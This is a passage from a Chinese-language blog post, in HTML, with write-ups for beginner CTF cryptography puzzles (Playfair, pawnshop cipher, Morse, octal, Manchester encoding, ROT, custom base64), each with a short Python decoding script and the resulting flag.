href="#1-古典-Cipher" class="headerlink" title="1.古典-Cipher"></a>1.古典-Cipher</h2><pre class="line-numbers language-none"><code class="language-none">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>普莱费尔(playfair)密码</code>，密码表类似为</p><pre class="line-numbers language-none"><code class="language-none">p l a y fi r b c de g h k mn o q s tu v w x z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_45784859/article/details/105766145">看大佬的解析吧，懒得看了</a><br><a href="http://rumkin.com/tools/cipher/playfair.php">在线解playfair</a><br>解密为<code>Itisnotaproblemhavefun</code><br><code>flag&#123;itisnotaproblemhavefun&#125;</code></p><h2 id="2-古典-汉字的秘密"><a href="#2-古典-汉字的秘密" class="headerlink" title="2.古典-汉字的秘密"></a>2.古典-汉字的秘密</h2><p>当铺密码&lt;<code>原理即将汉字出头的头的个数转化为数字，如&lt;王:6,由:1,壮:9...等等&gt;，转为数字</code>&gt;，转为数字之后发现没超过127的和少于32的，所以转为ascii，然后得到<code>EJ&gt;CvSHMV7G9R9@?3k</code>，变异凯撒，用脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#@m4xlmum</span><span class="token keyword">import</span> stringlist1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#变异凯撒</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list1<span class="token punctuation">:</span>    f <span class="token operator">+=</span> <span class="token number">1</span>    list2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#转为小写</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list2<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>FLAG&#123;YOU_ARE_GOOD&#125;</code>、<code>flag&#123;you_are_good&#125;</code></p><h2 id="3-莫斯-robomunication"><a href="#3-莫斯-robomunication" class="headerlink" title="3.莫斯-robomunication"></a>3.莫斯-robomunication</h2><p>是音频bi、bu两种音，分别对应于莫斯密码的短横线与点，这个全靠手动了，没什么好说的。</p><pre class="line-numbers language-morse" data-language="morse"><code class="language-morse">....&#x2F;.&#x2F;.-..&#x2F;.-..&#x2F;---&#x2F;.--&#x2F;....&#x2F;.-&#x2F;-&#x2F;..&#x2F;...&#x2F;-&#x2F;....&#x2F;.&#x2F;-.-&#x2F;.&#x2F;-.--&#x2F;..&#x2F;-&#x2F;..&#x2F;...&#x2F;-...&#x2F;---&#x2F;---&#x2F;.--.&#x2F;-...&#x2F;.&#x2F;.&#x2F;.--.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线解密后为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">HELLO WHAT IS THE KEY IT IS BOOPBEEPflag&#123;BOOPBEEP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-八进制与ASCII-密码学的心声"><a href="#4-八进制与ASCII-密码学的心声" class="headerlink" title="4.八进制与ASCII-密码学的心声"></a>4.八进制与ASCII-密码学的心声</h2><p>这个给的数据跟提示在简谱上，注意到他提示八进制，ascii码。猜测应该是三个一组的八进制转为十进制再转为ASCII码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span>s <span class="token operator">=</span> <span class="token string">'111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150'</span>data <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># output: ILoveSecurityVeryMuch</span><span class="token comment"># flag&#123;ILoveSecurityVeryMuch&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-曼彻斯特编码-传感器"><a href="#5-曼彻斯特编码-传感器" class="headerlink" title="5.曼彻斯特编码-传感器"></a>5.曼彻斯特编码-传感器</h2><p>给的数据为</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">5555555595555A65556AA696AA6666666955<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示为</p><pre class="line-numbers language-none"><code class="language-none">这是某压力传感器无线数据包解调后但未解码的报文(hex)已知其ID为0xFED31F，请继续将报文完整解码，提交hex。提示1：曼联<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>曼彻斯特编码是将数据转为二进制之后，将01电平跳变表示1, 10的电平跳变表示0，也就是<code>01-&gt;1、10-&gt;0</code>，开始的时候解出来的不对，后来看WP知道有八位倒序传输协议，需要每八位re一下。</p><p>bin-&gt;hex，对比ID并不重合，根据<code>八位倒序传输协议</code>将二进制每八位reverse，转hex</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> binasciidata <span class="token operator">=</span> <span class="token string">'5555555595555A65556AA696AA6666666955'</span>ans <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> temp    a <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>    b <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">'01'</span><span class="token punctuation">:</span>        ans <span class="token operator">+=</span> <span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ans <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        ans <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ans <span class="token operator">+=</span> <span class="token string">'1'</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">+=</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># FFFFFED31F645055F9</span><span class="token comment"># flag&#123;FFFFFED31F645055F9&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-变形rot加密-rot"><a href="#6-变形rot加密-rot" class="headerlink" title="6.变形rot加密-rot"></a>6.变形rot加密-rot</h2><p>看题的名字就知道了是rot了，给的数据如下</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密，简单了解了rot加密的原理之后，先测试加减的位数，很明显变换是在ASCII表上进行的，并且前后的rot显然也不同，前面的ascii大都小于90，后面的ascii大都大于110，可见前面的是加个数，后面的是减去一个数，从而有如下脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span>s <span class="token operator">=</span> <span class="token string">'83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112'</span>data <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""下面测出移动的位数    for j in range(20):        char = chr(d+j)        if char == 'f':            print(j)    """</span>    bit <span class="token operator">=</span> <span class="token number">19</span>    char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token operator">+</span>bit<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>flag2 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bit ='</span><span class="token punctuation">,</span> bit<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token operator">-</span>bit<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/25/BUUOJ-crypto/image-20210503220600094.png" alt="image-20210503220600094"></p><p>显然，位移为-13时的应该是答案，故flag为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;www_shiyanbar_com_is_very_good_????&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>….原来????是还没确定的意思，我还以为已经好了…</p><p>再写个脚本爆破</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">import</span> stringflag <span class="token operator">=</span> <span class="token string">'flag&#123;www_shiyanbar_com_is_very_good_'</span>md55 <span class="token operator">=</span> <span class="token string">'38e4c352809e150186920aac37190cbc'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>                md555 <span class="token operator">=</span> flag <span class="token operator">+</span> i <span class="token operator">+</span> j <span class="token operator">+</span> a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">'&#125;'</span>                <span class="token keyword">if</span> md55 <span class="token operator">==</span> md5<span class="token punctuation">(</span>md555<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>md555<span class="token punctuation">)</span><span class="token comment"># flag&#123;www_shiyanbar_com_is_very_good_@8Mu&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-变形base64-BJDCTF2020-这是base"><a href="#7-变形base64-BJDCTF2020-这是base" class="headerlink" title="7.变形base64-[BJDCTF2020]这是base??"></a>7.变形base64-[BJDCTF2020]这是base??</h2><p>给了变形对照的加密表，直接将原来的替换过来再解b64就OK了</p><pre class="line-numbers language-none"><code class="language-none">dict:&#123;0: &#39;J&#39;, 1: &#39;K&#39;, 2: &#39;L&#39;, 3: &#39;M&#39;, 4: &#39;N&#39;, 5: &#39;O&#39;, 6: &#39;x&#39;, 7: &#39;y&#39;, 8: &#39;U&#39;, 9: &#39;V&#39;, 10: &#39;z&#39;, 11: &#39;A&#39;, 12: &#39;B&#39;, 13: &#39;C&#39;, 14: &#39;D&#39;, 15: &#39;E&#39;, 16: &#39;F&#39;, 17: &#39;G&#39;, 18: &#39;H&#39;, 19: &#39;7&#39;, 20: &#39;8&#39;, 21: &#39;9&#39;, 22: &#39;P&#39;, 23: &#39;Q&#39;, 24: &#39;I&#39;, 25: &#39;a&#39;, 26: &#39;b&#39;, 27: &#39;c&#39;, 28: &#39;d&#39;, 29: &#39;e&#39;, 30: &#39;f&#39;, 31: &#39;g&#39;, 32: &#39;h&#39;, 33: &#39;i&#39;, 34: &#39;j&#39;, 35: &#39;k&#39;, 36: &#39;l&#39;, 37: &#39;m&#39;, 38: &#39;W&#39;, 39: &#39;X&#39;, 40: &#39;Y&#39;, 41: &#39;Z&#39;, 42: &#39;0&#39;, 43: &#39;1&#39;, 44: &#39;2&#39;, 45: &#39;3&#39;, 46: &#39;4&#39;, 47: &#39;5&#39;, 48: &#39;6&#39;, 49: &#39;R&#39;, 50: &#39;S&#39;, 51: &#39;T&#39;, 52: &#39;n&#39;, 53: &#39;o&#39;, 54: &#39;p&#39;, 55: &#39;q&#39;, 56: &#39;r&#39;, 57: &#39;s&#39;, 58: &#39;t&#39;, 59: &#39;u&#39;, 60: &#39;v&#39;, 61: &#39;w&#39;, 62: &#39;+&#39;, 63: &#39;&#x2F;&#39;, 64: &#39;&#x3D;&#39;&#125;chipertext:FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> string<span class="token keyword">import</span> base64dic1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">:</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">:</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">:</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">:</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">:</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">:</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">:</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">:</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">:</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">:</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">:</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">:</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">:</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">:</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">:</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">:</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">:</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">:</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">:</span> <span class="token string">'='</span><span class="token punctuation">&#125;</span>dic2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>strdic2 <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>strdic2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dic2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> strdic2<span class="token punctuation">[</span>i<span class="token punctuation">]</span>chipertext <span class="token operator">=</span> <span class="token string">'FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'</span>ans <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> chipertext<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dic1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> dic1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            ans <span class="token operator">+=</span> dic2<span class="token punctuation">[</span>j<span class="token punctuation">]</span>flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'BJD&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;'</span><span class="token comment"># flag&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-jsfuck-这是什么"><a href="#8-jsfuck-这是什么" class="headerlink" 